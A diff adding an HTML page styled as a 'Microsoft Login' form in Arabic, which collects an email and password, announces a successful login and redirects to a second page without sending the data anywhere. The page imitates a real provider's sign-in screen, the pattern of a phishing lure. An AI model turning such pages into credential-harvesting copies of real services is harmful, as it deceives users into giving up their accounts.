@@ -1,1 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Login</title>
+    <style>
+        /* إعدادات الصفحة */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(45deg, #1e3c72, #2a5298, #6b73ff);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            color: white;
+        }
+
+        /* رسومات الخلفية */
+        .bubble {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            animation: float 8s infinite ease-in-out;
+        }
+
+        .bubble:nth-child(1) { width: 80px; height: 80px; top: 10%; left: 20%; animation-duration: 10s; }
+        .bubble:nth-child(2) { width: 120px; height: 120px; top: 50%; left: 70%; animation-duration: 12s; }
+        .bubble:nth-child(3) { width: 200px; height: 200px; bottom: 20%; left: 40%; animation-duration: 14s; }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-30px); }
+        }
+
+        /* صندوق تسجيل الدخول */
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        input {
+            padding: 10px;
+            font-size: 1rem;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        button {
+            background: #0078d7;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1rem;
+            padding: 10px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #005a9e;
+        }
+
+        .note {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+    <!-- الرسومات -->
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+
+    <!-- صندوق تسجيل الدخول -->
+    <div class="container">
+        <h1>تسجيل الدخول بحساب Microsoft</h1>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p class="note">يرجى ملء جميع الحقول للتأكد من صحة البيانات.</p>
+    </div>
+
+    <script>
+        // التحقق من ملء الحقول والانتقال إلى الملف الثاني
+        const form = document.getElementById('loginForm');
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault(); // منع الإرسال الافتراضي
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!email || !password) {
+                alert('يرجى ملء جميع الحقول!');
+            } else {
+                alert('تم تسجيل الدخول بنجاح!');
+                window.location.href = 'second.html'; // الانتقال إلى الملف الثاني
+            }
+        });
+    </script>
+</body>
+</html>
 
